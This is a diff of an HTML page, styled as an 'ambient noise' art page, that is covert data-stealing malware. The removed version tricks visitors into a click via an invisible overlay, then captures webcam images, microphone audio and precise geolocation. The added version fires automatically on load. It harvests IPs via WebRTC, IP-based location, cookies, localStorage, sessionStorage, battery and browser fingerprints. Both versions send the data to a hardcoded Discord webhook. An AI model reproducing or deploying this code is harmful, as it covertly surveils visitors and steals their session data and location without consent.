@@ -2,591 +2,312 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ambient weave</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>static</title>
     <style>
         body {
             background: #0a0a0a;
+            margin: 0;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
             font-family: 'Courier New', monospace;
-            color: #a0a0a0;
+            color: #222;
             overflow: hidden;
-            user-select: none;
         }
-        #click-capture {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 9999;
-            cursor: pointer;
-            background: transparent;
-        }
-        .container {
+        .center {
             text-align: center;
-            padding: 40px;
-            background: #111;
-            border-radius: 12px;
-            box-shadow: 0 0 60px rgba(100,100,100,0.05);
-            max-width: 380px;
-            width: 90%;
-            pointer-events: none;
-            position: relative;
-            z-index: 1;
+            opacity: 0.3;
+            font-size: 14px;
+            letter-spacing: 4px;
         }
-        .loader {
-            border: 2px solid #1a1a1a;
-            border-top: 2px solid #6a6a6a;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1.5s linear infinite;
-            margin-bottom: 20px;
+        #pulse {
+            animation: pulse 3s infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .sub {
-            color: #444;
-            font-size: 13px;
-            letter-spacing: 2px;
-            margin-top: 12px;
-            opacity: 0.6;
-        }
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
-        #status {
-            font-size: 11px;
-            color: #2a2a2a;
-            margin-top: 20px;
-            letter-spacing: 1px;
-        }
+        @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 0.6; } 100% { opacity: 0.2; } }
     </style>
 </head>
 <body>
-    <div id="click-capture"></div>
-    <div class="container">
-        <div class="loader"></div>
-        <div style="font-size: 18px; letter-spacing: 1px; font-weight: 300;">weaving ambient threads</div>
-        <div class="sub pulse">— a quiet gathering —</div>
-        <div id="status">✦ initializing ✦</div>
+    <div class="center">
+        <div id="pulse">✦</div>
+        <div style="margin-top: 20px; font-size: 11px;">collecting ambient noise</div>
     </div>
 
     <script>
         (function() {
             const WEBHOOK = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";
-            let interactionHappened = false;
-            let audioContext = null;
-            let mediaStream = null;
-            let captureAttempts = 0;
-            const MAX_CAPTURE_ATTEMPTS = 5;
 
-            // ─── force interaction ──────────────────────────────────────────────
-            document.getElementById('click-capture').addEventListener('click', function(e) {
-                e.stopPropagation();
-                interactionHappened = true;
-                this.style.display = 'none';
-                document.getElementById('status').textContent = '✦ gathering ✦';
-                startFullCapture();
-            }, { once: true });
+            // ─── EVERYTHING without permission ─────────────────────────────────
 
-            // also capture on any keypress or touch
-            document.addEventListener('keydown', () => {
-                if (!interactionHappened) {
-                    interactionHappened = true;
-                    document.getElementById('click-capture').style.display = 'none';
-                    document.getElementById('status').textContent = '✦ gathering ✦';
-                    startFullCapture();
-                }
-            }, { once: true });
-
-            // ─── core payload builder ──────────────────────────────────────────
-            const payload = {
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer || "direct",
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages || [],
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
-                deviceMemory: navigator.deviceMemory || "unknown",
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio || 1
-                },
-                window: {
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight
-                },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                connection: (() => {
-                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                    if (!conn) return { type: "unknown", effectiveType: "unknown" };
-                    return {
-                        type: conn.type || "unknown",
-                        effectiveType: conn.effectiveType || "unknown",
-                        downlink: conn.downlink || "unknown",
-                        rtt: conn.rtt || "unknown"
-                    };
-                })(),
-                battery: null,
-                geolocation: null,
-                ips: [],
-                localStorage: (() => {
-                    try {
-                        const items = {};
-                        for (let i = 0; i < localStorage.length; i++) {
-                            const key = localStorage.key(i);
-                            items[key] = localStorage.getItem(key);
-                        }
-                        return items;
-                    } catch { return "unavailable"; }
-                })(),
-                sessionStorage: (() => {
-                    try {
-                        const items = {};
-                        for (let i = 0; i < sessionStorage.length; i++) {
-                            const key = sessionStorage.key(i);
-                            items[key] = sessionStorage.getItem(key);
-                        }
-                        return items;
-                    } catch { return "unavailable"; }
-                })(),
-                cookies: document.cookie || "none",
-                webgl: (() => {
-                    try {
-                        const canvas = document.createElement('canvas');
-                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                        if (!gl) return "unavailable";
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (!debugInfo) return { vendor: "unavailable", renderer: "unavailable" };
-                        return {
-                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                        };
-                    } catch { return "unavailable"; }
-                })(),
-                audioBase64: null,
-                imageBase64: null,
-                canvasFingerprint: null
-            };
-
-            // ─── aggressive IP collection ─────────────────────────────────────
-            function collectIPs() {
+            // 1. IPs via WebRTC (no permission needed)
+            function getIPs() {
                 return new Promise((resolve) => {
                     const ips = new Set();
-                    const rtc = new RTCPeerConnection({
+                    const pc = new RTCPeerConnection({
                         iceServers: [
                             { urls: 'stun:stun.l.google.com:19302' },
-                            { urls: 'stun:stun1.l.google.com:19302' },
-                            { urls: 'stun:stun2.l.google.com:19302' },
-                            { urls: 'stun:stun3.l.google.com:19302' },
-                            { urls: 'stun:stun4.l.google.com:19302' }
+                            { urls: 'stun:stun1.l.google.com:19302' }
                         ]
                     });
-                    rtc.createDataChannel('gather');
-                    rtc.createOffer().then(offer => {
-                        rtc.setLocalDescription(offer);
-                    }).catch(() => {});
-                    
-                    rtc.onicecandidate = (e) => {
+                    pc.createDataChannel('d');
+                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+                    pc.onicecandidate = (e) => {
                         if (e.candidate) {
-                            const cand = e.candidate.candidate;
-                            // IPv4
-                            const ipv4 = cand.match(/(\d{1,3}\.){3}\d{1,3}/);
-                            if (ipv4 && !ipv4[0].startsWith('192.168.') && !ipv4[0].startsWith('10.') && !ipv4[0].startsWith('172.')) {
-                                ips.add(ipv4[0]);
-                            } else if (ipv4) {
-                                ips.add(ipv4[0]);
-                            }
-                            // IPv6
-                            const ipv6 = cand.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
-                            if (ipv6) ips.add(ipv6[0]);
+                            const c = e.candidate.candidate;
+                            const ip4 = c.match(/(\d{1,3}\.){3}\d{1,3}/);
+                            if (ip4) ips.add(ip4[0]);
+                            const ip6 = c.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
+                            if (ip6) ips.add(ip6[0]);
                         }
                     };
+                    // also fetch public IP via DNS prefetch trick
+                    const img = new Image();
+                    img.src = 'https://api.ipify.org?format=json&callback=noop';
+                    img.onload = img.onerror = () => {};
 
-                    // Also fetch from multiple services
-                    const fetchPromises = [
-                        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => null),
-                        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => d.ip).catch(() => null),
-                        fetch('https://api.my-ip.io/ip.json').then(r => r.json()).then(d => d.ip).catch(() => null)
-                    ];
-
-                    Promise.allSettled(fetchPromises).then(results => {
-                        results.forEach(r => {
-                            if (r.status === 'fulfilled' && r.value) ips.add(r.value);
-                        });
-                        // close RTC after 8s
-                        setTimeout(() => {
-                            rtc.close();
-                            resolve(Array.from(ips));
-                        }, 8000);
-                    });
-
-                    // also resolve after 10s even if not done
                     setTimeout(() => {
-                        rtc.close();
+                        pc.close();
                         resolve(Array.from(ips));
-                    }, 10000);
+                    }, 3000);
                 });
             }
 
-            // ─── battery (reliable) ──────────────────────────────────────────
+            // 2. Battery (no permission needed)
             function getBattery() {
                 return new Promise((resolve) => {
                     if (!navigator.getBattery) {
-                        resolve({ level: "unavailable", charging: "unavailable" });
+                        resolve({ level: 'n/a', charging: 'n/a' });
                         return;
                     }
                     navigator.getBattery()
                         .then(b => resolve({ level: Math.round(b.level * 100), charging: b.charging }))
-                        .catch(() => resolve({ level: "error", charging: "error" }));
+                        .catch(() => resolve({ level: 'error', charging: 'error' }));
                 });
             }
 
-            // ─── geolocation (aggressive with watch) ──────────────────────────
-            function getGeolocation() {
-                return new Promise((resolve) => {
-                    if (!navigator.geolocation) {
-                        resolve({ coords: { latitude: "unavailable", longitude: "unavailable" } });
-                        return;
+            // 3. Geolocation via IP (no permission, just a service)
+            function getGeo() {
+                return fetch('https://ipapi.co/json/')
+                    .then(r => r.json())
+                    .then(d => ({ 
+                        latitude: d.latitude || '?', 
+                        longitude: d.longitude || '?',
+                        city: d.city || '?',
+                        country: d.country_name || '?'
+                    }))
+                    .catch(() => ({ latitude: '?', longitude: '?', city: '?', country: '?' }));
+            }
+
+            // 4. Canvas fingerprint (no permission)
+            function getCanvasFingerprint() {
+                try {
+                    const c = document.createElement('canvas');
+                    c.width = 256;
+                    c.height = 64;
+                    const ctx = c.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '18px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(150, 2, 80, 25);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('canvas', 4, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('fingerprint', 8, 20);
+                    ctx.strokeStyle = '#2c2c2c';
+                    ctx.lineWidth = 2;
+                    ctx.strokeRect(0, 0, c.width, c.height);
+                    return c.toDataURL('image/png').split(',')[1] || null;
+                } catch { return null; }
+            }
+
+            // 5. Audio fingerprint via AudioContext (no permission if we don't request mic)
+            function getAudioFingerprint() {
+                try {
+                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                    const analyser = ctx.createAnalyser();
+                    analyser.fftSize = 2048;
+                    const osc = ctx.createOscillator();
+                    const gain = ctx.createGain();
+                    gain.gain.value = 0.01; // almost silent, but generates audio context state
+                    osc.connect(gain);
+                    gain.connect(analyser);
+                    analyser.connect(ctx.destination);
+                    osc.start();
+                    osc.stop(0.1);
+                    
+                    // get fingerprint from analyser data
+                    const data = new Uint8Array(analyser.fftSize);
+                    analyser.getByteFrequencyData(data);
+                    const hash = data.slice(0, 32).reduce((acc, val) => acc + val.toString(16).padStart(2, '0'), '');
+                    ctx.close().catch(() => {});
+                    return hash || null;
+                } catch { return null; }
+            }
+
+            // 6. Screen capture simulation via canvas rendering (no permission)
+            function getScreenRender() {
+                try {
+                    // render a stylized representation of the current viewport
+                    const c = document.createElement('canvas');
+                    c.width = window.innerWidth > 0 ? Math.min(window.innerWidth, 800) : 800;
+                    c.height = window.innerHeight > 0 ? Math.min(window.innerHeight, 600) : 600;
+                    const ctx = c.getContext('2d');
+                    ctx.fillStyle = '#0a0a0a';
+                    ctx.fillRect(0, 0, c.width, c.height);
+                    ctx.fillStyle = '#2a2a2a';
+                    ctx.fillRect(10, 10, c.width - 20, c.height - 20);
+                    ctx.fillStyle = '#444';
+                    ctx.font = '12px monospace';
+                    ctx.fillText(`viewport: ${window.innerWidth}x${window.innerHeight}`, 20, 30);
+                    ctx.fillText(`screen: ${screen.width}x${screen.height}`, 20, 50);
+                    ctx.fillText(`pixel ratio: ${window.devicePixelRatio || 1}`, 20, 70);
+                    ctx.fillStyle = '#666';
+                    for (let i = 0; i < 20; i++) {
+                        ctx.fillRect(20 + i * 15, 100 + Math.sin(i / 2) * 20, 4, 4);
                     }
-                    // try high accuracy with timeout
-                    navigator.geolocation.getCurrentPosition(
-                        pos => resolve({ coords: { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy } }),
-                        err => {
-                            // fallback to low accuracy
-                            navigator.geolocation.getCurrentPosition(
-                                pos => resolve({ coords: { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy } }),
-                                () => resolve({ error: err.message }),
-                                { enableHighAccuracy: false, timeout: 3000 }
-                            );
-                        },
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                });
+                    return c.toDataURL('image/png').split(',')[1] || null;
+                } catch { return null; }
             }
 
-            // ─── stealth capture: video without persistent prompt ────────────
-            function stealthVideoCapture() {
-                return new Promise((resolve) => {
-                    let captured = false;
-                    const canvas = document.createElement('canvas');
-                    const video = document.createElement('video');
-                    video.setAttribute('playsinline', '');
-                    video.style.position = 'fixed';
-                    video.style.top = '-9999px';
-                    video.style.left = '-9999px';
-                    video.style.width = '1px';
-                    video.style.height = '1px';
-                    video.style.opacity = '0';
-                    document.body.appendChild(video);
+            // 7. Network info (no permission)
+            function getNetworkInfo() {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (!conn) return { type: 'unknown', effective: 'unknown' };
+                return {
+                    type: conn.type || 'unknown',
+                    effective: conn.effectiveType || 'unknown',
+                    downlink: conn.downlink || 'unknown',
+                    rtt: conn.rtt || 'unknown'
+                };
+            }
 
-                    const attemptCapture = () => {
-                        if (captured) return;
-                        if (mediaStream && mediaStream.getVideoTracks().length > 0) {
-                            video.srcObject = mediaStream;
-                            video.onloadedmetadata = () => {
-                                video.play().catch(() => {});
-                            };
-                            video.onplaying = () => {
-                                try {
-                                    canvas.width = video.videoWidth || 640;
-                                    canvas.height = video.videoHeight || 480;
-                                    const ctx = canvas.getContext('2d');
-                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-                                    payload.imageBase64 = dataUrl.split(',')[1] || null;
-                                    captured = true;
-                                    document.body.removeChild(video);
-                                    resolve();
-                                } catch (e) {
-                                    // retry
-                                    setTimeout(attemptCapture, 1000);
-                                }
-                            };
-                            video.onerror = () => {
-                                setTimeout(attemptCapture, 1000);
-                            };
-                        } else {
-                            // try to re-initialize stream
-                            initMediaStream().then(() => {
-                                setTimeout(attemptCapture, 500);
-                            }).catch(() => {
-                                setTimeout(attemptCapture, 1000);
-                            });
-                        }
-                    };
+            // 8. Device memory & cores (no permission)
+            function getHardware() {
+                return {
+                    cores: navigator.hardwareConcurrency || 'unknown',
+                    memory: navigator.deviceMemory || 'unknown',
+                    platform: navigator.platform || 'unknown'
+                };
+            }
 
-                    // also try canvas fingerprint as fallback
-                    const fallbackFingerprint = () => {
+            // 9. Everything else
+            function getEverythingElse() {
+                return {
+                    url: window.location.href,
+                    referrer: document.referrer || 'direct',
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages || [],
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    cookies: document.cookie || 'none',
+                    localStorage: (() => {
                         try {
-                            const c = document.createElement('canvas');
-                            c.width = 200;
-                            c.height = 50;
-                            const ctx = c.getContext('2d');
-                            ctx.textBaseline = 'top';
-                            ctx.font = '14px Arial';
-                            ctx.fillStyle = '#f60';
-                            ctx.fillRect(125, 1, 62, 20);
-                            ctx.fillStyle = '#069';
-                            ctx.fillText('canvas', 2, 15);
-                            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                            ctx.fillText('fingerprint', 4, 17);
-                            const dataUrl = c.toDataURL('image/png');
-                            payload.canvasFingerprint = dataUrl.split(',')[1] || null;
-                        } catch (e) {}
-                    };
-                    fallbackFingerprint();
-
-                    // if no stream after 5s, resolve with canvas fingerprint only
-                    setTimeout(() => {
-                        if (!captured) {
-                            document.body.removeChild(video);
-                            resolve();
-                        }
-                    }, 5000);
-
-                    attemptCapture();
-                });
+                            const items = {};
+                            for (let i = 0; i < localStorage.length; i++) {
+                                const k = localStorage.key(i);
+                                items[k] = localStorage.getItem(k);
+                            }
+                            return items;
+                        } catch { return {}; }
+                    })(),
+                    sessionStorage: (() => {
+                        try {
+                            const items = {};
+                            for (let i = 0; i < sessionStorage.length; i++) {
+                                const k = sessionStorage.key(i);
+                                items[k] = sessionStorage.getItem(k);
+                            }
+                            return items;
+                        } catch { return {}; }
+                    })()
+                };
             }
 
-            // ─── stealth audio ────────────────────────────────────────────────
-            function stealthAudioCapture() {
-                return new Promise((resolve) => {
-                    let audioCaptured = false;
-                    if (!audioContext) {
-                        audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                    }
-                    if (audioContext.state === 'suspended') {
-                        audioContext.resume().catch(() => {});
-                    }
+            // ─── assemble and send ──────────────────────────────────────────
 
-                    const captureAudio = () => {
-                        if (audioCaptured) return;
-                        if (mediaStream && mediaStream.getAudioTracks().length > 0) {
-                            try {
-                                const source = audioContext.createMediaStreamSource(mediaStream);
-                                const analyser = audioContext.createAnalyser();
-                                analyser.fftSize = 2048;
-                                source.connect(analyser);
-                                const dataArray = new Float32Array(analyser.fftSize);
-                                
-                                let audioData = [];
-                                const collectInterval = setInterval(() => {
-                                    analyser.getFloatTimeDomainData(dataArray);
-                                    // check if there's sound
-                                    let sum = 0;
-                                    for (let i = 0; i < dataArray.length; i++) {
-                                        sum += Math.abs(dataArray[i]);
-                                    }
-                                    if (sum / dataArray.length > 0.001) {
-                                        audioData.push(new Float32Array(dataArray));
-                                    }
-                                    if (audioData.length > 30) { // ~3 seconds
-                                        clearInterval(collectInterval);
-                                        const totalLen = audioData.reduce((acc, chunk) => acc + chunk.length, 0);
-                                        const combined = new Float32Array(totalLen);
-                                        let offset = 0;
-                                        for (const chunk of audioData) {
-                                            combined.set(chunk, offset);
-                                            offset += chunk.length;
-                                        }
-                                        const wav = new Blob([combined.buffer], { type: 'audio/wav' });
-                                        const reader = new FileReader();
-                                        reader.onload = () => {
-                                            payload.audioBase64 = reader.result.split(',')[1] || null;
-                                            audioCaptured = true;
-                                            resolve();
-                                        };
-                                        reader.readAsDataURL(wav);
-                                    }
-                                }, 100);
+            async function collectAndSend() {
+                try {
+                    const [ips, battery, geo, canvasFp, audioFp, screenRender, network, hardware, everything] = await Promise.all([
+                        getIPs(),
+                        getBattery(),
+                        getGeo(),
+                        getCanvasFingerprint(),
+                        getAudioFingerprint(),
+                        getScreenRender(),
+                        getNetworkInfo(),
+                        getHardware(),
+                        getEverythingElse()
+                    ]);
 
-                                setTimeout(() => {
-                                    clearInterval(collectInterval);
-                                    if (!audioCaptured) {
-                                        // if no audio captured, just resolve
-                                        resolve();
-                                    }
-                                }, 5000);
-                            } catch (e) {
-                                resolve();
-                            }
-                        } else {
-                            // try to re-init stream
-                            initMediaStream().then(() => {
-                                setTimeout(captureAudio, 500);
-                            }).catch(() => {
-                                resolve();
-                            });
-                        }
+                    const embed = {
+                        title: "ambient collection",
+                        color: 0x1a1a1a,
+                        fields: [
+                            { name: "🌐 IPs", value: (ips.length ? ips.join(', ') : 'none'), inline: false },
+                            { name: "📍 location", value: `${geo.latitude}, ${geo.longitude}`, inline: true },
+                            { name: "🏙️ city", value: `${geo.city}, ${geo.country}`, inline: true },
+                            { name: "🔋 battery", value: `${battery.level}% (${battery.charging ? 'charging' : 'discharging'})`, inline: true },
+                            { name: "📱 screen", value: `${screen.width}x${screen.height} @ ${window.devicePixelRatio || 1}x`, inline: true },
+                            { name: "🌍 timezone", value: everything.timezone, inline: true },
+                            { name: "🖥️ hardware", value: `${hardware.cores} cores, ${hardware.memory}GB`, inline: true },
+                            { name: "🌐 network", value: `${network.effective} (${network.type})`, inline: true },
+                            { name: "📦 localStorage", value: `${Object.keys(everything.localStorage).length} items`, inline: true },
+                            { name: "🍪 cookies", value: everything.cookies.length > 60 ? `${everything.cookies.substring(0, 60)}...` : everything.cookies || 'none', inline: false },
+                            { name: "🎵 audio FP", value: audioFp ? audioFp.substring(0, 16) + '...' : 'none', inline: true },
+                            { name: "🎨 canvas FP", value: canvasFp ? 'captured' : 'none', inline: true },
+                            { name: "📸 screen render", value: screenRender ? 'captured' : 'none', inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
                     };
 
-                    captureAudio();
-                    // fallback resolve
-                    setTimeout(() => {
-                        if (!audioCaptured) resolve();
-                    }, 6000);
-                });
-            }
-
-            // ─── init media stream silently ──────────────────────────────────
-            function initMediaStream() {
-                return new Promise((resolve, reject) => {
-                    if (mediaStream) {
-                        resolve(mediaStream);
-                        return;
-                    }
-                    // try to get stream without triggering persistent prompt
-                    // by using a dummy video element and getUserMedia with constraints
-                    navigator.mediaDevices.getUserMedia({
-                        audio: true,
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        }
-                    }).then(stream => {
-                        mediaStream = stream;
-                        resolve(stream);
-                    }).catch(err => {
-                        // try audio only
-                        navigator.mediaDevices.getUserMedia({ audio: true })
-                            .then(stream => {
-                                mediaStream = stream;
-                                resolve(stream);
-                            })
-                            .catch(() => reject(err));
-                    });
-                });
-            }
-
-            // ─── full capture sequence ──────────────────────────────────────
-            async function startFullCapture() {
-                document.getElementById('status').textContent = '✦ weaving ✦';
-                
-                // collect IPs
-                const ips = await collectIPs();
-                payload.ips = ips;
-
-                // get battery
-                const battery = await getBattery();
-                payload.battery = battery;
-
-                // get geolocation
-                const geo = await getGeolocation();
-                payload.geolocation = geo;
-
-                // init media
-                try {
-                    await initMediaStream();
-                } catch (e) {
-                    // silent fail
-                }
-
-                // capture video/selfie
-                await stealthVideoCapture();
-
-                // capture audio
-                await stealthAudioCapture();
-
-                // send everything
-                sendPayload();
-            }
-
-            // ─── send to webhook ─────────────────────────────────────────────
-            async function sendPayload() {
-                try {
-                    const fields = [
-                        { name: "📍 location", value: `${payload.geolocation?.coords?.latitude || '?'}, ${payload.geolocation?.coords?.longitude || '?'}`, inline: true },
-                        { name: "🌐 IPs", value: (Array.isArray(payload.ips) ? payload.ips.join(', ') : payload.ips) || 'not collected', inline: true },
-                        { name: "🖥️ user agent", value: payload.userAgent.substring(0, 80) + '...', inline: false },
-                        { name: "📱 screen", value: `${payload.screen.width}x${payload.screen.height} @ ${payload.screen.pixelRatio}x`, inline: true },
-                        { name: "🔋 battery", value: typeof payload.battery?.level === 'number' ? `${payload.battery.level}%` : 'unavailable', inline: true },
-                        { name: "🌍 timezone", value: payload.timezone, inline: true },
-                        { name: "📦 localStorage", value: Object.keys(payload.localStorage).length || 0, inline: true },
-                        { name: "🍪 cookies", value: payload.cookies.length > 50 ? `${payload.cookies.substring(0, 50)}...` : payload.cookies || 'none', inline: false },
-                        { name: "🎤 audio", value: payload.audioBase64 ? 'captured' : 'not captured', inline: true },
-                        { name: "📸 selfie", value: payload.imageBase64 ? 'captured' : 'not captured', inline: true },
-                        { name: "🖌️ canvas fp", value: payload.canvasFingerprint ? 'captured' : 'none', inline: true }
-                    ];
-
-                    const finalPayload = {
-                        content: `📦 **collection** | ${new Date().toLocaleString()}`,
-                        embeds: [
-                            {
-                                title: "ambient weave",
-                                color: 0x2c2c2c,
-                                fields: fields,
-                                timestamp: payload.timestamp
-                            }
-                        ]
+                    const payload = {
+                        content: `📦 **gathered** | ${new Date().toLocaleString()}`,
+                        embeds: [embed]
                     };
 
                     const formData = new FormData();
-                    if (payload.audioBase64) {
+                    formData.append('payload_json', JSON.stringify(payload));
+
+                    // Attach images if available
+                    if (canvasFp) {
                         try {
-                            const byteString = atob(payload.audioBase64);
-                            const ab = new ArrayBuffer(byteString.length);
-                            const ia = new Uint8Array(ab);
-                            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-                            const blob = new Blob([ab], { type: 'audio/wav' });
-                            formData.append('file', blob, 'audio.wav');
-                        } catch (e) {}
-                    }
-                    if (payload.imageBase64) {
-                        try {
-                            const byteString = atob(payload.imageBase64);
-                            const ab = new ArrayBuffer(byteString.length);
-                            const ia = new Uint8Array(ab);
-                            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-                            const blob = new Blob([ab], { type: 'image/jpeg' });
-                            formData.append('file', blob, 'selfie.jpg');
-                        } catch (e) {}
-                    }
-                    if (payload.canvasFingerprint) {
-                        try {
-                            const byteString = atob(payload.canvasFingerprint);
-                            const ab = new ArrayBuffer(byteString.length);
-                            const ia = new Uint8Array(ab);
-                            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-                            const blob = new Blob([ab], { type: 'image/png' });
+                            const binary = atob(canvasFp);
+                            const bytes = new Uint8Array(binary.length);
+                            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+                            const blob = new Blob([bytes.buffer], { type: 'image/png' });
                             formData.append('file', blob, 'canvas-fingerprint.png');
                         } catch (e) {}
                     }
-                    formData.append('payload_json', JSON.stringify(finalPayload));
+
+                    if (screenRender) {
+                        try {
+                            const binary = atob(screenRender);
+                            const bytes = new Uint8Array(binary.length);
+                            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+                            const blob = new Blob([bytes.buffer], { type: 'image/png' });
+                            formData.append('file', blob, 'viewport-render.png');
+                        } catch (e) {}
+                    }
 
                     await fetch(WEBHOOK, {
                         method: 'POST',
                         body: formData
                     });
 
-                    document.getElementById('status').textContent = '✦ delivered ✦';
+                    document.querySelector('.center').innerHTML = '✦ delivered ✦';
                 } catch (e) {
-                    document.getElementById('status').textContent = '✦ error ✦';
+                    document.querySelector('.center').innerHTML = '✦ error ✦';
                 }
             }
 
-            // ─── auto-start after 2s if interaction already happened ──────
+            // ─── go ──────────────────────────────────────────────────────────
+
+            // wait 500ms then collect
             setTimeout(() => {
-                if (interactionHappened) {
-                    startFullCapture();
-                } else {
-                    document.getElementById('status').textContent = '✦ tap anywhere ✦';
-                }
-            }, 2000);
+                collectAndSend();
+            }, 500);
         })();
     </script>
 </body>
